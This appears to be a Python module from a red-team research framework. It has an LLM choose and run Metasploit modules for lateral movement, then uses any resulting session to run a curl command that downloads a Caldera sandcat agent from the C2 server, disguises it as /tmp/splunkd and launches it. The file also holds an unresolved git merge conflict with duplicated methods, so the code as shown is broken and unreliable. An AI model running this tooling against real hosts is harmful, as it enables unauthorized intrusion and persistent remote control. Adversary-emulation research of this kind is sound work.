import asyncio
import json
import os
import time
from string import Template
from typing import Any, Dict

from incalmo.core.actions.HighLevel.llm_agents.llm_agent_action import LLMAgentAction
from incalmo.core.services.metasploit_service import MetasploitService
from incalmo.core.models.events import Event, InfectedNewHost, BashOutputEvent
from incalmo.core.models.network import Host
from incalmo.core.services import (
    LowLevelActionOrchestrator,
    EnvironmentStateService,
    AttackGraphService,
)
from incalmo.core.services.action_context import HighLevelContext
from incalmo.core.strategies.llm.interfaces.llm_agent_interface import LLMAgentInterface

# Seconds to wait after deploying sandcat & before polling for a new Caldera agent
_SANDCAT_BEACON_WAIT = 10


class LLMLateralMoveMetasploit(LLMAgentAction):
    """LLM-driven lateral movement agent that uses Metasploit modules.

    The LLM is prompted with target host details and asked to select a
    Metasploit module (exploit / auxiliary / post) and configure its options.
    The agent executes the chosen module via MetasploitService, deploys the
    sandcat Caldera agent through any resulting session, then detects the new
    Caldera agent to emit an InfectedNewHost event.
    """

    def __init__(
        self,
        source_host: Host,
        target_host: Host,
        llm_interface: LLMAgentInterface,
        metasploit_service: MetasploitService,
    ) -> None:
        self.source_host = source_host
        self.target_host = target_host
        self.metasploit_service = metasploit_service
        self.llm_interface = llm_interface
        self.llm_interface.set_preprompt(self.get_preprompt())
        super().__init__(llm_interface)

<<<<<<< Updated upstream:incalmo/core/actions/HighLevel/llm_agents/msf_lateral_movement/llm_ms_lateral_move.py
=======




    # Convenience methods for Metasploit operations

    def run_exploit_module(
        self,
        module_path: str,
        options: dict,
        payload_path: str | None = None,
        payload_options: dict | None = None,
        timeout: int = 60,
    ) -> tuple[str | None, str]:
        """Run an exploit module and wait for a session.

        Returns:
            (session_id, output) where session_id is None if no session was
            obtained within *timeout* seconds.
        """
        exploit = self.metasploit_service.client.modules.use("exploit", module_path)
        for key, value in options.items():
            exploit[key] = value

        payload_obj = None
        if payload_path:
            payload_obj = self.metasploit_service.client.modules.use("payload", payload_path)
            for key, value in (payload_options or {}).items():
                payload_obj[key] = value

        # Capture sessions present before execution
        pre_sessions: set[str] = set(self.metasploit_service.client.sessions.list.keys())

        result = exploit.execute(payload=payload_obj)
        job_uuid = result.get("uuid", "")

        # Poll for a new session
        deadline = time.time() + timeout
        while time.time() < deadline:
            current_sessions = self.metasploit_service.client.sessions.list
            new_ids = set(current_sessions.keys()) - pre_sessions
            if new_ids:
                session_id = next(iter(new_ids))
                return session_id, f"Session {session_id} opened (job {job_uuid})."
            time.sleep(1)

        return None, f"No session obtained after {timeout}s (job {job_uuid})."

    def run_auxiliary_module(
        self,
        module_path: str,
        options: dict,
        timeout: int = 60,
    ) -> str:
        """Run an auxiliary module and return its console output."""
        return self._run_via_console(
            commands=self._build_module_commands("auxiliary", module_path, options),
            timeout=timeout,
        )

    def run_post_module(
        self,
        session_id: str,
        module_path: str,
        options: dict,
        timeout: int = 30,
    ) -> str:
        """Run a post-exploitation module on an existing session."""
        options_with_session = {"SESSION": session_id, **options}
        return self._run_via_console(
            commands=self._build_module_commands("post", module_path, options_with_session),
            timeout=timeout,
        )

    def run_command_on_session(
        self,
        session_id: str,
        command: str,
        timeout: int = 30,
    ) -> str:
        """Execute a shell command on an open Meterpreter/shell session."""
        session = self.metasploit_service.client.sessions.session(session_id)
        return session.run_with_output(command, timeout=timeout)

    def list_sessions(self) -> dict:
        """Return all currently active sessions."""
        return self.metasploit_service.client.sessions.list

    def close_session(self, session_id: str) -> None:
        """Terminate an active session."""
        self.metasploit_service.client.sessions.session(session_id).stop()

    # Internal helpers

    def _build_module_commands(
        self, module_type: str, module_path: str, options: dict
    ) -> list[str]:
        commands = [f"use {module_type}/{module_path}"]
        for key, value in options.items():
            commands.append(f"set {key} {value}")
        commands.append("run -j")
        return commands

    def _run_via_console(self, commands: list[str], timeout: int) -> str:
        """Write commands to a new MSF console and collect output."""
        console = self.metasploit_service.client.consoles.console()
        console_id = console["id"]
        try:
            for cmd in commands:
                self.metasploit_service.client.consoles.console(console_id).write(cmd + "\n")

            output = ""
            deadline = time.time() + timeout
            while time.time() < deadline:
                data = self.metasploit_service.client.consoles.console(console_id).read()
                output += data.get("data", "")
                if not data.get("busy", True):
                    break
                time.sleep(1)
            return output
        finally:
            self.metasploit_service.client.consoles.destroy(console_id)


>>>>>>> Stashed changes:incalmo/core/actions/HighLevel/llm_agents/msf_lateral_movement/agent.py
    @classmethod
    def from_params(
        cls, params: Dict[str, Any], llm_interface: LLMAgentInterface
    ) -> "LLMLateralMoveMetasploit":
        ess: EnvironmentStateService = llm_interface.environment_state_service

        # Accepts a None config with sensible defaults in case of previous
        # environment not exposing a metasploit_config attribute on EnvironmentStateService.
        msf_cfg = getattr(ess, "metasploit_config", None)

        src_host = ess.network.find_host_by_ip(params["src_host"])
        target_host = ess.network.find_host_by_ip(params["target_host"])

        if msf_cfg:
            msf_service = MetasploitService(
                password=msf_cfg.password,
                server=msf_cfg.host,
                port=msf_cfg.port,
                ssl=msf_cfg.ssl,
            )
        else:
            msf_service = MetasploitService(password="")

        return cls(src_host, target_host, llm_interface, msf_service)

    # Main loop

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        events: list[Event] = []

        source_agent = self.source_host.get_agent()
        if not source_agent:
            return events

        # Substitute $server in preprompt with known C2 address
        preprompt = self.llm_interface.get_preprompt()
        preprompt = Template(preprompt).safe_substitute(
            {"server": environment_state_service.c2c_server}
        )
        self.llm_interface.set_preprompt(preprompt)

        # Snapshot agents present before any exploitation attempt
        prior_agents = environment_state_service.get_agents()
        prior_paws = {a.paw for a in prior_agents}

        sandcat_cmd = (
            f"curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' "
            f"{environment_state_service.c2c_server}/file/download > /tmp/splunkd; "
            f"chmod +x /tmp/splunkd; "
            f"/tmp/splunkd -server {environment_state_service.c2c_server} -group red &"
        )

        cur_response = ""

        for _ in range(self.MAX_CONVERSATION_LEN):
            new_msg = self.llm_interface.send_message(cur_response)

            # Check for finished before all else
            if self.llm_interface.extract_tag(new_msg, "finished") is not None:
                break

            module_json = self.llm_interface.extract_tag(new_msg, "module")
            if not module_json:
                cur_response = (
                    "Your response did not contain a <module> block. "
                    "Please provide your module selection in the required JSON format."
                )
                continue

            # Parse JSON the LLM produced
            try:
                module_spec = json.loads(module_json)
            except json.JSONDecodeError as exc:
                cur_response = f"Could not parse module JSON: {exc}. Please fix the JSON and try again."
                continue

            module_type: str = module_spec.get("module_type", "")
            module_path: str = module_spec.get("module_path", "")
            options: dict = module_spec.get("options", {})
            payload: str | None = module_spec.get("payload")
            payload_options: dict = module_spec.get("payload_options") or {}

            if not module_type or not module_path:
                cur_response = (
                    "module_type and module_path are required fields. Please try again."
                )
                continue

            # Dispatch to MetasploitService
            try:
                if module_type == "exploit":
                    session_id, output = self.metasploit_service.run_exploit_module(
                        module_path=module_path,
                        options=options,
                        payload_path=payload,
                        payload_options=payload_options,
                    )

                    if session_id:
                        # Deploy Caldera sandcat agent through the session
                        deploy_output = self.metasploit_service.run_command_on_session(
                            session_id, sandcat_cmd
                        )

                        # Wait for agent to beacon back to Caldera
                        await asyncio.sleep(_SANDCAT_BEACON_WAIT)

                        # Detect new Caldera agents on target host
                        new_event = self._detect_new_agent(
                            environment_state_service, prior_paws, source_agent
                        )
                        if new_event:
                            events.append(new_event)
                            break

                        cur_response = (
                            f"Session {session_id} opened but the sandcat agent did not beacon back.\n"
                            f"Deploy command output: {deploy_output}\n"
                            "Please try a different approach or payload."
                        )
                    else:
                        cur_response = (
                            f"Module ran but no session was obtained.\n"
                            f"Output: {output}\n"
                            "Please adjust the module or options and try again."
                        )

                elif module_type == "auxiliary":
                    output = self.metasploit_service.run_auxiliary_module(
                        module_path=module_path, options=options
                    )
                    cur_response = (
                        f"Auxiliary module completed.\nOutput:\n{output}\n"
                        "Use this information to select an exploit module."
                    )

                elif module_type == "post":
                    # Requires existing session; tries to find one
                    sessions = self.metasploit_service.list_sessions()
                    if not sessions:
                        cur_response = "No active sessions found. You must obtain a session before running a post module."
                        continue
                    session_id = next(iter(sessions.keys()))
                    output = self.metasploit_service.run_post_module(
                        session_id=session_id,
                        module_path=module_path,
                        options=options,
                    )
                    cur_response = f"Post module completed on session {session_id}.\nOutput:\n{output}"

                else:
                    cur_response = (
                        f"Unknown module_type '{module_type}'. "
                        "Valid values are: exploit, auxiliary, post."
                    )

            except Exception as exc:  # noqa: BLE001
                cur_response = (
                    f"Error while executing module {module_type}/{module_path}: {exc}\n"
                    "Please try a different module or fix the options."
                )

        return events

    # Helper fns

    def _detect_new_agent(
        self,
        environment_state_service: EnvironmentStateService,
        prior_paws: set[str],
        source_agent: Any,
    ) -> InfectedNewHost | None:
        """Compare current Caldera agents against the prior snapshot.

        Returns an InfectedNewHost event if a new agent appeared on the
        target host's IP addresses, otherwise None.
        """
        post_agents = environment_state_service.get_agents()
        target_ips = set(self.target_host.ip_addresses)

        for agent in post_agents:
            if agent.paw in prior_paws:
                continue
            if target_ips.intersection(agent.host_ip_addrs):
                return InfectedNewHost(source_agent, agent)

        return None

    def get_preprompt(self) -> str:
        cur_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(cur_dir, "preprompt.txt"), "r") as f:
            preprompt = f.read()

        parameters = {
            "target_host": str(self.target_host),
            "source_host": str(self.source_host),
            "port": str(self.target_host.open_ports),
        }
        return Template(preprompt).safe_substitute(parameters)
